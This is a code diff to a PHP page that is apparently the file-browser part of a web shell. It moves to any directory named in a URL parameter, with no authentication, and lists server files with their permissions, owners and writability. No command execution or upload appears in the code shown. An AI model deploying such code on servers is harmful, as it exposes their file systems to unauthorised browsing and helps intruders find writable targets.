@@ -1,13 +1,21 @@
 <style type="text/css">
+	@import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
 	body {
+		margin-left:200px;
+		margin-right:200px;
 		overflow: hidden;
+	}
+	* {
+		font-family: 'Roboto', sans-serif;
 	}
 	.files {
 		overflow: auto;
 		border-radius:20px;
 		background: #fff;
 		padding:15px;
-		box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+		height:auto;
+		border:1px solid #e0e0e0;
+		max-height:79%;
 	}
 	.block {
         clear: both;
@@ -32,22 +40,22 @@
     }
     .block .date .dir-size,
     .block .date .file-size {
-        min-width:90px;
+        margin-right:10px;
         display: inline-block;
     }
     .block .date .dir-perms,
     .block .date .file-perms {
-        min-width:100px;
+        margin-right:10px;
         display: inline-block;
     }
     .block .date .dir-time,
     .block .date .file-time {
-        min-width:150px;
+        margin-right:10px;
         display: inline-block;
     }
     .block .date .dir-owner,
     .block .date .file-owner {
-        min-width:100px;
+        margin-right:10px;
         display: inline-block;
     }
 
@@ -65,7 +73,7 @@
     }
     .cwd {
     	overflow:hidden;
-    	box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+    	border:1px solid #e0e0e0;
     	padding:20px;
     	border-radius:20px;
     	margin-bottom:10px;
@@ -84,7 +92,7 @@
     	background: #e3e3e3;
     }
     .disk {
-    	background: green;
+    	
     }
     .disk,
     .pwdd {
@@ -96,7 +104,7 @@
     	width:3%;
     	padding:5px;
     	display: inline-block;
-    	background: red;
+    	
     	margin-right:5px;
     }
     .usb .img,
@@ -118,15 +126,36 @@
     	position: absolute;
     	display: inline-block;
     }
-    .span {
-    	position: absolute;
-    	padding:5px;
-    	margin-right:-20px;
-    	background: pink;
-    	display: inline-block;
+    table.disk {
+    	border-collapse: collapse;
+    	border-spacing:0;
+    }
+    table.disk td:first-child {
+    	width:130px;
+    }
+    table.disk td:nth-child(2) {
+    	width:10px;
+    	text-align: center;
+    }
+    table.disk td:nth-child(3) {
+    }
+    .pwdd table {
+    	border-collapse: collapse;
+    	border-spacing:0;
+    	width:100%;
+    }
+    .pwdd table td:first-child {
+    	width:130px;
+    }
+    .pwdd table td:nth-child(2) {
+    	width:10px;
+    	text-align: center;
+    }
+    .pwdd table td:last-child {
     }
 </style>
 <?php
+date_default_timezone_set("Asia/Jakarta");
 if (isset($_GET['x'])) {
 	cd($_GET['x']);
 }
@@ -146,11 +175,228 @@ function files($getcwd, $type) {
 				}
 				break;
 		}
-		$filename['name'] = basename($filename['fullname']);
+		$filename['name']  = basename($filename['fullname']);
+		$filename['ftime'] = ftime($filename['fullname']);
+		$filename['owner'] = owner($filename['fullname']);
+		$filename['size']  = is_dir($filename['fullname']) ? countDir($filename['fullname']) . " items" : size($filename['fullname']);
 
 		$array[] = $filename; 
 	} return $array;
 }
+function perms($filename) {
+	$perms = @fileperms($filename);
+        switch ($perms & 0xf000) {
+            case 0xc000:
+                $info = 's';
+                break;
+            case 0xa000:
+                $info = 'l';
+                break;
+            case 0x8000:
+                $info = 'r';
+                break;
+            case 0x6000:
+                $info = 'b';
+                break;
+            case 0x4000:
+                $info = 'd';
+                break;
+            case 0x2000:
+                $info = 'c';
+                break;
+            case 0x1000:
+                $info = 'p';
+                break;
+            default:
+                $info = 'u';
+        }
+        $info .= $perms & 0x0100 ? 'r' : '-';
+        $info .= $perms & 0x0080 ? 'w' : '-';
+        $info .= $perms & 0x0040 ? 
+        		($perms & 0x0800 ? 's': 'x'):
+        		($perms & 0x0800 ? 'S' : '-');
+        $info .= $perms & 0x0020 ? 'r' : '-';
+        $info .= $perms & 0x0010 ? 'w' : '-';
+        $info .= $perms & 0x0008 ?
+        		($perms & 0x0400 ? 's' : 'x'):
+        		($perms & 0x0400 ? 'S' : '-');
+        $info .= $perms & 0x0004 ? 'r' : '-';
+        $info .= $perms & 0x0002 ? 'w' : '-';
+        $info .= $perms & 0x0001 ?
+        		($perms & 0x0200 ? 't' : 'x'):
+        		($perms & 0x0200 ? 'T' : '-');
+        return $info;
+}
+function getext($filename)
+    {
+        return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    }
+function geticon($filename)
+    {
+        switch (getext($filename)) {
+            case 'php1':
+            case 'php2':
+            case 'php3':
+            case 'php4':
+            case 'php5':
+            case 'php6':
+            case 'phtml':
+            case 'php':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337947.svg'
+                );
+                break;
+            case 'html':
+            case 'htm':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337937.svg'
+                );
+                break;
+            case 'css':
+                print(
+                    'https://image.flaticon.com/icons/svg/136/136527.svg'
+                );
+                break;
+            case 'js':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337941.svg'
+                );
+                break;
+            case 'json':
+                print(
+                    'https://image.flaticon.com/icons/svg/136/136525.svg'
+                );
+                break;
+            case 'xml':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337959.svg'
+                );
+                break;
+            case 'py':
+                print(
+                    'https://image.flaticon.com/icons/svg/617/617531.svg'
+                );
+                break;
+            case 'zip':
+                print(
+                    'https://image.flaticon.com/icons/svg/2306/2306214.svg'
+                );
+                break;
+            case 'rar':
+                print(
+                    'https://image.flaticon.com/icons/svg/2306/2306170.svg'
+                );
+                break;
+            case 'htaccess':
+                print(
+                    'https://image.flaticon.com/icons/png/128/1720/1720444.png'
+                );
+                break;
+            case 'txt':
+                print(
+                    'https://image.flaticon.com/icons/svg/136/136538.svg'
+                );
+                break;
+            case 'ini':
+                print(
+                    'https://image.flaticon.com/icons/svg/1126/1126890.svg'
+                );
+                break;
+            case 'mp3':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337944.svg'
+                );
+                break;
+            case 'mp4':
+                print(
+                    'https://image.flaticon.com/icons/svg/2306/2306142.svg'
+                );
+                break;
+            case 'log':
+            case 'log1':
+            case 'log2':
+                print(
+                    'https://image.flaticon.com/icons/svg/2306/2306124.svg'
+                );
+                break;
+            case 'dat':
+                print(
+                    'https://image.flaticon.com/icons/svg/2306/2306050.svg'
+                );
+                break;
+            case 'exe':
+                print(
+                    'https://image.flaticon.com/icons/svg/136/136531.svg'
+                );
+                break;
+            case 'apk':
+                print(
+                    'https://1.bp.blogspot.com/-HZGGTdD2niI/U2KlyCpOVnI/AAAAAAAABzI/bavDJBFSo-Q/s1600/apk-icon.jpg'
+                );
+                break;
+            case 'yaml':
+                print(
+                    'https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png'
+                );
+                break;
+            case 'bak':
+                print(
+                    'https://image.flaticon.com/icons/svg/2125/2125736.svg'
+                );
+                break;
+            case 'ico':
+                print(
+                    'https://image.flaticon.com/icons/svg/1126/1126873.svg'
+                );
+                break;
+            case 'png':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337948.svg'
+                );
+                break;
+            case 'jpg':
+            case 'jpeg':
+            case 'webp':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337940.svg'
+                );
+                break;
+            case 'svg':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337954.svg'
+                );
+                break;
+            case 'gif':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337936.svg'
+                );
+                break;
+            case 'pdf':
+                print(
+                    'https://image.flaticon.com/icons/svg/337/337946.svg'
+                );
+                break;
+            default:
+                print(
+                    'https://image.flaticon.com/icons/svg/833/833524.svg'
+                );break;
+        }
+    }
+function wr($filename, $perms, $type)
+    {
+        if (is_writable($filename)) {
+            switch ($type) {
+                case 1:
+                    print "<font color='#000'>{$perms}</font>";
+                    break;
+                case 2:
+                    print "<font color='green'>{$perms}</font>";
+                    break;
+            }
+        } else {
+            print "<font color='red'>{$perms}</font>";
+        }
+    }
 function pwd() {
 	$path = getcwd();
 	$path = str_replace('\\', '/', $path);
@@ -201,9 +447,19 @@ function disk() {
 	   		$letters .= "</a>";
 	  	}
 	}
-	if(!empty($letters)) {
-		print "<div class='span'>Detected Drives :</div> {$letters}<br>";
-	}
+	if(!empty($letters)) { ?>
+		<table class="disk" width="100%">
+			<tr>
+				<td>
+					Detected Drives
+				</td>
+				<td>:</td>
+				<td>
+					<?= $letters ?>
+				</td>
+			</tr>
+		</table>
+	<?php }
 	if(@count($quicklaunch) > 0) {
 		foreach($quicklaunch as $item) {
 	  		$v = realpath(getcwd(). "..");
@@ -217,15 +473,65 @@ function disk() {
 	}
 }
 function cd($directory) {
-	chdir($directory);
+	@chdir($directory);
+	if (!@chdir($directory)) {
+		echo "not anything";
+	}
 }
+function countDir($filename){
+	return @count(scandir($filename)) - 2;
+}
+function size($filename) {
+	if (is_file($filename)) {
+		$filepath = $filename;
+		if (!realpath($filepath)) {
+			$filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
+		}
+		$filesize = filesize($filepath);
+		$array = ["TB", "GB", "MB", "KB", "Byte"];
+		$total = count($array);
+		while ($total-- && $filesize > 1024) {
+			$filesize /= 1024;
+		}
+		return round($filesize, 2) . " " . $array[$total];
+	}
+}
+function ftime($filename) {
+	return date('d M Y - H:i A', @filemtime($filename));
+}
+function owner($filename)
+    {
+        if (function_exists("posix_getpwuid")) {
+            $owner = @posix_getpwuid(fileowner($filename));
+            $owner = $owner['name'];
+        } else {
+            $owner = fileowner($filename);
+        }
+        if (function_exists("posix_getgrgid")) {
+            $group = @posix_getgrgid(filegroup($filename));
+            $group = $group['name'];
+        } else {
+            $group = filegroup($filename);
+        }
+        return $owner ."<span class='group'>/".$group ."</span>";
+    }
 ?>
 <div class="cwd">
 	<div class="disk">
 		<span><?= disk() ?></span>
 	</div>
 	<div class="pwdd">
-		Current Dir : <?= pwd() ?>
+		<table>
+			<tr>
+				<td>
+					Current Dir
+				</td>
+				<td>:</td>
+				<td>
+					<?= pwd() ?>
+				</td>
+			</tr>
+		</table>
 	</div>
 </div>
 <div class="files">
@@ -240,16 +546,16 @@ function cd($directory) {
 					<?= $dir['name'] ?>
 					<div class="date">
 						<div class="dir-size">
-							//size
+							<?= $dir['size'] ?>
 						</div>
 						<div class="dir-perms">
-							//perms
+							<?= wr($dir['fullname'],perms($dir['fullname']), 2) ?>
 						</div>
 						<div class="dir-time">
-							//time
+							<?= $dir['ftime'] ?>
 						</div>
 						<div class="dir-owner">
-							//owner
+							<?= $dir['owner'] ?>
 						</div>
 					</div>
 				</div>
@@ -260,22 +566,22 @@ function cd($directory) {
 		<div class="block">
 			<a href="#<?= $file['name'] ?>" title="<?= $file['name'] ?>">
 				<div class="img">
-					<img src="https://image.flaticon.com/icons/svg/833/833524.svg">
+					<img src="<?= geticon($file['fullname']) ?>">
 				</div>
 				<div class="name">
 					<?= $file['name'] ?>
 					<div class="date">
 						<div class="file-size">
-							//size
+							<?= $file['size'] ?>
 						</div>
 						<div class="file-perms">
-							//perms
+							<?= wr($file['fullname'],perms($file['fullname']), 2) ?>
 						</div>
 						<div class="file-time">
-							//time
+							<?= $file['ftime'] ?>
 						</div>
 						<div class="file-owner">
-							//owner
+							<?= $file['owner'] ?>
 						</div>
 					</div>
 				</div>
